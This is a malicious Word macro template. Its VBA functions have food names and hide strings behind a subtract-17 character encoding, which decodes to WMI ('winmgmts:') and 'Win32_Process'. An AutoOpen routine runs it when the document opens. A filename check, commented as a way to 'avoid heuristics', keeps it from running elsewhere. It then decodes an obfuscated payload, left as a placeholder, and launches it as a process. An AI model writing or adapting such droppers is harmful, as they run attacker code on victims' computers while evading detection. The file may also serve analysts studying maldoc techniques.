Function Pears(Beets)
  Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
  Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
  Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
  Do
  Oatmilk = Oatmilk + Pears(Strawberries(Milk))
  Milk = Almonds(Milk)
  Loop While Len(Milk) > 0
  Nuts = Oatmilk
End Function

Function Macro()
  ' avoid heuristics based on  file name
  If ActiveDocument.Name <> Nuts("<insert document name>") Then
    Exit Function
  End If

  Dim Apples As String
  Dim Water As String
  Apples = "<insert obfuscated payload>"
  Water = Nuts(Apples)
  GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function

Sub AutoOpen()
  Macro
End Sub